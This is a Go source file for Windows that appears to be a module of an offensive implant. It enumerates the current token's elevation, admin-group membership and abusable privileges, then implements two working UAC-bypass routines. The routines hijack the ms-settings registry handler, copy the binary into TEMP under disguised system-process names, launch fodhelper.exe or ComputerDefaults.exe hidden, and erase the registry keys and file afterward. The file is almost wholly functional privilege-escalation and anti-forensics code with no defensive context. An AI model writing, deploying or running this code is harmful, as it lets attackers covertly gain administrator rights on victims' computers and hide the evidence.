package main

import (
"fmt"
"os"
"os/exec"
"os/user"
"path/filepath"
"strings"
"syscall"
"time"
"unsafe"

"golang.org/x/sys/windows"
"golang.org/x/sys/windows/registry"
)

func IsElevated() bool {
token := windows.GetCurrentProcessToken()
return token.IsElevated()
}

func IsSystem() bool {
u, err := user.Current()
if err != nil || u == nil {
return false
}
name := strings.ToUpper(u.Username)
return strings.HasSuffix(name, `\SYSTEM`) || name == "SYSTEM"
}

// IsUserInAdminGroup checks the LINKED (unfiltered) token for membership in
// the local Administrators group.
func IsUserInAdminGroup() bool {
var token windows.Token
if err := windows.OpenProcessToken(windows.CurrentProcess(),
windows.TOKEN_QUERY, &token); err != nil {
return false
}
defer token.Close()

var linked windows.Token
var retLen uint32
err := windows.GetTokenInformation(
token,
windows.TokenLinkedToken,
(*byte)(unsafe.Pointer(&linked)),
uint32(unsafe.Sizeof(linked)),
&retLen,
)
check := token
if err == nil && linked != 0 {
check = linked
defer linked.Close()
}

sid, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
if err != nil {
return false
}
member, err := check.IsMember(sid)
return err == nil && member
}

// HasPrivilege reports whether the token holds the named privilege.
//
// NOTE: x/sys/windows declares Tokenprivileges.Privileges as a fixed-size
// [1]LUIDAndAttributes. Reading past index 0 with a fixed array triggers a Go
// bounds-check panic. We use unsafe.Slice to treat the trailing memory as a
// slice of exactly PrivilegeCount entries.
func HasPrivilege(name string) bool {
var token windows.Token
if err := windows.OpenProcessToken(windows.CurrentProcess(),
windows.TOKEN_QUERY, &token); err != nil {
return false
}
defer token.Close()

namePtr, err := windows.UTF16PtrFromString(name)
if err != nil {
return false
}
var want windows.LUID
if err := windows.LookupPrivilegeValue(nil, namePtr, &want); err != nil {
return false
}

// First call: size the buffer.
var retLen uint32
_ = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &retLen)
if retLen == 0 {
return false
}
buf := make([]byte, retLen)
if err := windows.GetTokenInformation(token, windows.TokenPrivileges,
&buf[0], retLen, &retLen); err != nil {
return false
}

tp := (*windows.Tokenprivileges)(unsafe.Pointer(&buf[0]))

// FIX: expand the fixed [1] array into a slice of PrivilegeCount elements.
privs := unsafe.Slice(&tp.Privileges[0], int(tp.PrivilegeCount))
for i := range privs {
if privs[i].Luid == want {
return true
}
}
return false
}

func PrivescInfo() string {
var sb strings.Builder

username := "<unknown>"
if u, err := user.Current(); err == nil && u != nil {
username = u.Username
}

fmt.Fprintf(&sb, "=== Security Context ===\n")
fmt.Fprintf(&sb, "Elevated:         %v\n", IsElevated())
fmt.Fprintf(&sb, "SYSTEM:           %v\n", IsSystem())
fmt.Fprintf(&sb, "In Admin group:   %v\n", IsUserInAdminGroup())
fmt.Fprintf(&sb, "User:             %s\n", username)

fmt.Fprintf(&sb, "\n=== Relevant Privileges ===\n")
for _, p := range []string{
"SeDebugPrivilege",
"SeImpersonatePrivilege",
"SeAssignPrimaryTokenPrivilege",
"SeBackupPrivilege",
"SeRestorePrivilege",
"SeTakeOwnershipPrivilege",
"SeLoadDriverPrivilege",
"SeTcbPrivilege",
} {
mark := " "
if HasPrivilege(p) {
mark = "X"
}
fmt.Fprintf(&sb, "  [%s] %s\n", mark, p)
}

return sb.String()
}

// ----------------------------------------------------------------------------
// UAC bypass ? fodhelper.exe
// ----------------------------------------------------------------------------
func UACBypassFodhelper() error {
if IsElevated() {
return fmt.Errorf("already elevated")
}
if !IsUserInAdminGroup() {
return fmt.Errorf("user is not in Administrators ? UAC bypass will not work")
}

self, err := os.Executable()
if err != nil {
return fmt.Errorf("locate self: %w", err)
}
if resolved, err := filepath.EvalSymlinks(self); err == nil {
self = resolved
}

tempExe := filepath.Join(os.Getenv("TEMP"), "winsat.exe")
data, err := os.ReadFile(self)
if err != nil {
return fmt.Errorf("read self: %w", err)
}
if err := os.WriteFile(tempExe, data, 0755); err != nil {
return fmt.Errorf("write temp exe: %w", err)
}

keyPath := `Software\Classes\ms-settings\shell\open\command`
k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath,
registry.SET_VALUE|registry.CREATE_SUB_KEY)
if err != nil {
return fmt.Errorf("create key: %w", err)
}
if err := k.SetStringValue("", fmt.Sprintf(`"%s" --elevated --no-persist`, tempExe)); err != nil {
k.Close()
return fmt.Errorf("set default: %w", err)
}
if err := k.SetStringValue("DelegateExecute", ""); err != nil {
k.Close()
return fmt.Errorf("set DelegateExecute: %w", err)
}
k.Close()

cmd := exec.Command(`C:\Windows\System32\fodhelper.exe`)
cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
if err := cmd.Start(); err != nil {
return fmt.Errorf("launch fodhelper: %w", err)
}

go func() {
time.Sleep(15 * time.Second)
registry.DeleteKey(registry.CURRENT_USER, keyPath)
registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open`)
registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell`)
registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
_ = os.Remove(tempExe)
}()

return nil
}

// UACBypassComputerDefaults ? fallback if fodhelper is blocked.
func UACBypassComputerDefaults() error {
if IsElevated() {
return fmt.Errorf("already elevated")
}
if !IsUserInAdminGroup() {
return fmt.Errorf("user is not in Administrators")
}

self, err := os.Executable()
if err != nil {
return err
}
if resolved, err := filepath.EvalSymlinks(self); err == nil {
self = resolved
}

tempExe := filepath.Join(os.Getenv("TEMP"), "ctfmon.exe")
data, err := os.ReadFile(self)
if err != nil {
return err
}
if err := os.WriteFile(tempExe, data, 0755); err != nil {
return err
}

keyPath := `Software\Classes\ms-settings\shell\open\command`
k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath,
registry.SET_VALUE|registry.CREATE_SUB_KEY)
if err != nil {
return err
}
_ = k.SetStringValue("", fmt.Sprintf(`"%s" --elevated --no-persist`, tempExe))
_ = k.SetStringValue("DelegateExecute", "")
k.Close()

cmd := exec.Command(`C:\Windows\System32\ComputerDefaults.exe`)
cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
if err := cmd.Start(); err != nil {
return err
}

go func() {
time.Sleep(15 * time.Second)
registry.DeleteKey(registry.CURRENT_USER, keyPath)
registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open`)
registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell`)
registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
_ = os.Remove(tempExe)
}()

return nil
}
